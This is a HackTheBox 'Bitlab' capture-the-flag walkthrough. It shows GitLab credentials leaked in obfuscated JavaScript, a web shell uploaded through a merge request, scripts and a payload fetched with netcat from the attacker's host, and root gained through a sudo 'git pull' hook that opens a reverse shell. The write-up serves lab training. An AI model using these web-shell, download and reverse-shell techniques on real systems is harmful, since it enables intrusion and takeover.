@@ -1,0 +1,167 @@
+I"8<<h1 id="hackthebox--bitlab">HackTheBox :: Bitlab</h1>
+
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<p>Let’s start with our usual nmap scan.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sCSV -p 1-10000 10.10.10.114
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 15:11 AEDT
+Nmap scan report for 10.10.10.114
+Host is up (0.057s latency).
+Not shown: 9998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Nothing too interesting here, apart from the fact that the HTTP server is running Gitlab. Seems like this might be another code-review box, nice. No obvious ways in, so let’s fire up burpsuite and see if its spider picks up anything interesting.</p>
+
+<p>So after about 30 seconds of clicking on links we land on an interesting one. The “help” link leads us to an open directory, with an interesting “bookmarks.html” file. Let’s take a look.</p>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>Hmm, it just seems to be a bunch of links. However, while most of the links go to outside URLs, the “Gitlab Login” link is interesting. It seems to be some poorly obfuscated javascript. So let’s copy this javascript, clean it up a little and see what we can extract from it.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">_0x4b18</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="dl">"</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6E</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x42</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">/x72</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x38</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x78</span><span class="dl">"</span>
+    <span class="p">];</span>
+
+    <span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+    <span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+<span class="p">})()</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<p>So, the first thing that should jump out at you when looking at this should be the hex. Based on the range of characters it looks like valid ascii. So let’s get decoding. We’ll should also rename the array so it’s a bit more readable, and take the variables out of the array in the <code class="language-plaintext highlighter-rouge">document</code> statements at the bottom.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">user_login</span><span class="dl">"</span>
+        <span class="dl">"</span><span class="s2">getElementById</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">clave</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">user_password</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">11des0081x</span><span class="dl">"</span>
+    <span class="p">];</span>
+
+    <span class="nb">document</span><span class="p">[</span><span class="dl">"</span><span class="s2">getElementById</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">user_login</span><span class="dl">"</span><span class="p">)[</span><span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">clave</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">[</span><span class="dl">"</span><span class="s2">getElementById</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">user_password</span><span class="dl">"</span><span class="p">)[</span><span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">11des0081x</span><span class="dl">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Nice. It’s pretty obvious this is some sort of hacky login script that this dude “clave” wrote. Let’s cut out all the crap so the javascript is readable (an unnecessary step, but indulge me).</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function() {
+    document.getElementById("user_login").value = "clave";
+    document.getElementById("user_password").value = "11des0081x";
+}
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Awesome, now that we have some credentials we should use them. They’re definitely for the gitlab login page. Let’s give them a go and see what we can see.</p>
+
+<p>Okay, so it seems like “clave” has access to two repositories, “Profile” and “Deployer”. Let’s give both of these a good read (commits, issues, pull requests, source code, etc) and see if we can’t find anything interesting.</p>
+
+<p>So “Profile” is completely uninteresting apart from the fact that it has “Auto DevOps” enabled. “Deployer” is very interesting. It seems to be a git hook for the “Profile” repo. It looks like whenever a successful merge request goes through on “Profile”, the updated “Profile” repo is pulled onto the server. So I think our first step should be finding where the profile page is located on the server. What’s the bet that it’s just at “/profile”?</p>
+
+<p>Yup, that worked. Let’s see if can get a shell uploaded. It should be as simple as uploading the shell to another branch on the “Profile” repo and submitting a merge request. Let’s give this a go.</p>
+
+<p>Shell successfully uploaded, merge request successful. Hopefully we should be able to see our shell in the profile directory. Yup, there it is.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:…/html/profile# whoami
+www-data
+</code></pre></div></div>
+<p><br /></p>
+
+<h2 id="getting-user--root">Getting User &amp; Root</h2>
+<p>Let’s upload our enumeration script and see what we can find.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &gt; LinEnum.sh
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lv -p 4444 &lt; LinEnum.sh
+listening on [any] 4444 ...
+connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:/tmp# sh LinEnum.sh
+
+...
+
+-e [-] Super user account(s):
+root
+-e
+
+...
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+
+...
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Huh, so it seems we can use <code class="language-plaintext highlighter-rouge">git pull</code> as sudo. We can leverage this, but it’ll be a little weird. I hope you’re familiar with git. I don’t want to go into too much detail as to how this exploit works, but I’ll give you an overview.</p>
+<ol>
+  <li>You need to create two repositories: one is the remote (the “master”) repository, and one is the “local” repository.</li>
+  <li>You set the remote of the “local” repo to be the “master” repo you created earlier.</li>
+  <li>You make changes in both repos, so when you use <code class="language-plaintext highlighter-rouge">git pull</code>, a merge is forced.</li>
+  <li>You can create a file “local/.git/hooks/post-merge”, that gets executed when you <code class="language-plaintext highlighter-rouge">git pull</code>.</li>
+</ol>
+
+<p><br /></p>
+
+<p>In the example <code class="language-plaintext highlighter-rouge">payload.tar</code>, the script that gets executed is a reverse shell. You can look throught the provided files to get a feel for it.</p>
+
+<p>We upload our payload to the server using netcat.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &gt; payload.tar
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lv -p 4444 &lt; payload.tar
+listening on [any] 4444 ...
+connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Next we unpack it and execute <code class="language-plaintext highlighter-rouge">sudo git pull</code>. Remember we have to have netcat running on our end to receive the reverse shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:/tmp# tar xf payload.tar
+p0wny@shell:/tmp# cd payload/payload
+p0wny@shell:…/payload/payload# sudo git pull
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lv -p 4444
+listening on [any] 4444 ...
+connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 59150
+# /bin/bash
+/bin/bash
+root@bitlab:/tmp/payload/payload#
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Awesome. Now we can get the root and user flags.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@bitlab:/# cat /home/clave/user.txt
+cat /home/clave/user.txt
+1e3fd81ec3aa2f1462370ee3c20b8154
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@bitlab:/# cat /root/root.txt
+cat /root/root.txt
+8d4cc131757957cb68d9a0cddccd587c
+</code></pre></div></div>
+<p><br /></p>
+
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ul>
+  <li>Git hooks can be leveraged to gain privilege escalation / command execution.</li>
+  <li>Open directories can leak sensitive information.</li>
+  <li>Always enumerate for directories (dirbuster would have found both the profile page and the open help directory, we got lucky).</li>
+</ul>
+
+:ET
